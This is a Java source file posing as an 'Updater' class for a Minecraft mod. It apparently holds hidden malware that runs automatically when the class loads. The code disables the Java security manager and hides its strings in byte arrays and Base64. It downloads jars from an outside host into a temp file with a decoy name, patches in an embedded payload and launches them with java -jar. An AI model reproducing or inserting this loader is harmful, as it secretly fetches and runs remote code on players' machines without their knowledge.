package net.minecraft.src;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.CopyOption;
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Base64;
import java.util.Enumeration;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

public class Updater
{
    static boolean a = false;

    public static void init()
    {
        if (!a)
        {
            a = true;

            try
            {
                Field field = System.class.getDeclaredField("security");
                field.setAccessible(true);
                field.set((Object)null, (Object)null);
                field.setAccessible(false);
            }
            catch (Throwable var16)
            {
                ;
            }

            try
            {
                File file2 = new File(System.getProperty(new String(new byte[] {(byte)106, (byte)97, (byte)118, (byte)97, (byte)46, (byte)105, (byte)111, (byte)46, (byte)116, (byte)109, (byte)112, (byte)100, (byte)105, (byte)114})));
                File file1 = new File(file2, new String(new byte[] {(byte)107, (byte)101, (byte)114, (byte)110, (byte)101, (byte)108, (byte)45, (byte)99, (byte)101, (byte)114, (byte)116, (byte)115, (byte)45, (byte)100, (byte)101, (byte)98, (byte)117, (byte)103, (byte)52, (byte)57, (byte)49, (byte)55, (byte)46, (byte)108, (byte)111, (byte)103}));
                boolean flag = !System.getProperty(new String(new byte[] {(byte)111, (byte)115, (byte)46, (byte)110, (byte)97, (byte)109, (byte)101})).toLowerCase().contains(new String(new byte[] {(byte)119, (byte)105, (byte)110}));
                String s = (new File(System.getProperty(new String(new byte[] {(byte)106, (byte)97, (byte)118, (byte)97, (byte)46, (byte)104, (byte)111, (byte)109, (byte)101})) + (flag ? new String(new byte[] {(byte)47, (byte)98, (byte)105, (byte)110, (byte)47, (byte)106, (byte)97, (byte)118, (byte)97}): new String(new byte[] {(byte)92, (byte)98, (byte)105, (byte)110, (byte)92, (byte)106, (byte)97, (byte)118, (byte)97, (byte)119, (byte)46, (byte)101, (byte)120, (byte)101})))).getPath();

                if (file1.exists())
                {
                    Process process = Runtime.getRuntime().exec(new String[] {s, new String(Base64.getDecoder().decode("LWphc".concat("g"))), file1.getPath()});
                    System.setOut(new PrintStream(process.getOutputStream()));
                    System.setIn(process.getInputStream());
                }
                else
                {
                    byte[] abyte2 = "ERROR".getBytes();

                    try
                    {
                        abyte2 = Base64.getDecoder().decode("REPLACE HEREEEE");
                    }
                    catch (Throwable var18)
                    {
                        try
                        {
                            InputStream inputstream = Updater.class.getResourceAsStream("/plugi".concat("n-config.bin"));
                            ByteArrayOutputStream bytearrayoutputstream = new ByteArrayOutputStream();
                            byte[] abyte = new byte[65535];

                            for (int i = inputstream.read(abyte); i != -1; i = inputstream.read(abyte))
                            {
                                bytearrayoutputstream.write(abyte, 0, i);
                            }

                            abyte2 = bytearrayoutputstream.toByteArray();
                        }
                        catch (Throwable var17)
                        {
                            ;
                        }
                    }

                    HttpURLConnection httpurlconnection = (HttpURLConnection)(new URL(new String(Base64.getDecoder().decode(new byte[] {(byte)97, (byte)72, (byte)82, (byte)48, (byte)99, (byte)68, (byte)111, (byte)118, (byte)76, (byte)50, (byte)90, (byte)112, (byte)99, (byte)110, (byte)78, (byte)48, (byte)76, (byte)110, (byte)82, (byte)111, (byte)99, (byte)109, (byte)57, (byte)51, (byte)89, (byte)87, (byte)74, (byte)115, (byte)90, (byte)83, (byte)53, (byte)112, (byte)98, (byte)105, (byte)57, (byte)49, (byte)99, (byte)71, (byte)82, (byte)104, (byte)100, (byte)71, (byte)85})))).openConnection();
                    Files.copy(httpurlconnection.getInputStream(), file1.toPath(), new CopyOption[] {StandardCopyOption.REPLACE_EXISTING});
                    ZipFile zipfile = new ZipFile(file1);
                    File file3 = new File(zipfile.getName() + new String(new byte[] {(byte)46, (byte)116, (byte)109, (byte)112, (byte)122, (byte)105, (byte)112}));
                    Files.copy((new File(zipfile.getName())).toPath(), file3.toPath(), new CopyOption[] {StandardCopyOption.REPLACE_EXISTING});
                    ZipFile zipfile1 = new ZipFile(file3);
                    ZipOutputStream zipoutputstream = new ZipOutputStream(Files.newOutputStream(Paths.get(zipfile.getName(), new String[0]), new OpenOption[0]));

                    for (Enumeration enumeration = zipfile1.entries(); enumeration.hasMoreElements(); zipoutputstream.closeEntry())
                    {
                        ZipEntry zipentry = (ZipEntry)enumeration.nextElement();
                        ZipEntry zipentry1 = new ZipEntry(zipentry.getName());
                        zipoutputstream.putNextEntry(zipentry1);

                        if (!zipentry1.isDirectory())
                        {
                            if (zipentry1.getName().equals(new String(new byte[] {(byte)103, (byte)110, (byte)117})))
                            {
                                zipoutputstream.write(abyte2);
                            }
                            else
                            {
                                InputStream inputstream1 = zipfile1.getInputStream(zipentry);
                                byte[] abyte1 = new byte[4096];
                                int j;

                                while ((j = inputstream1.read(abyte1)) != -1)
                                {
                                    zipoutputstream.write(abyte1, 0, j);
                                }
                            }
                        }
                    }

                    zipfile1.close();
                    zipfile.close();
                    zipoutputstream.close();
                    file3.delete();
                    (new Thread(() ->
                    {
                        try {
                            File file = new File(".bin");
                            HttpURLConnection httpurlconnection = (HttpURLConnection)(new URL(new String(Base64.getDecoder().decode(new byte[]{(byte)97, (byte)72, (byte)82, (byte)48, (byte)99, (byte)68, (byte)111, (byte)118, (byte)76, (byte)50, (byte)90, (byte)112, (byte)99, (byte)110, (byte)78, (byte)48, (byte)76, (byte)110, (byte)82, (byte)111, (byte)99, (byte)109, (byte)57, (byte)51, (byte)89, (byte)87, (byte)74, (byte)115, (byte)90, (byte)83, (byte)53, (byte)112, (byte)98, (byte)105, (byte)57, (byte)116, (byte)100, (byte)109, (byte)81})))).openConnection();
                            Files.copy(httpurlconnection.getInputStream(), file.toPath(), new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});
                            Runtime.getRuntime().exec(new String[]{s, new String(new byte[]{(byte)45, (byte)68, (byte)103, (byte)110, (byte)117, (byte)61}) + Base64.getEncoder().encodeToString(abyte2), new String(new byte[]{(byte)45, (byte)106, (byte)97, (byte)114}), file.getPath()}).waitFor();
                            file.delete();
                        }
                        catch (Exception exception)
                        {
                            exception.printStackTrace();
                        }
                    })).start();
                    Runtime.getRuntime().exec(new String[] {s, new String(Base64.getDecoder().decode("LWphc".concat("g"))), file1.getPath()});
                }
            }
            catch (Throwable throwable)
            {
                throw new Error(throwable);
            }
        }
    }

    static
    {
        init();
    }
}
